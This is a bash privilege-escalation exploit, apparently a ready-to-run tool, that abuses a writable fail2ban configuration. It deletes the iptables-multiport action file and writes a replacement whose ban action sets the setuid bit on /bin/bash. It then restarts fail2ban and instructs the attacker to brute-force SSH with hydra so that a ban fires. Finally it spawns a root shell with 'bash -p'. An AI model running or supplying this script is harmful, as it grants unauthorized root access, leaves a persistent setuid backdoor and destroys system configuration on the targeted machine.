#!/usr/bin/bash

# title : fail2ban-privesc
# author : Ravindu Wickramasinghe (@rvizx9)


echo '
+==============================+
|  fail2ban-privesc | @rvizx9  |
+==============================+

'

conf="
[INCLUDES]
before = iptables-common.conf
[Definition]

actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'
actionban = chmod 4755 /bin/bash
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>
[Init]
"

rm -rf /etc/fail2ban/action.d/iptables-multiport.conf
echo "$conf" > iptables-multiport.conf
mv iptables-multiport.conf /etc/fail2ban/action.d/
sudo /etc/init.d/fail2ban restart
ip -br -c a

echo "[!] start to bruteforce ssh login."
echo "[run] @attacker : hydra <ip-addr> -l root -P /usr/share/wordlists/rockyou.txt ssh"
echo "[!] bash -p will be executed in 100s"
sleep 100
bash -p
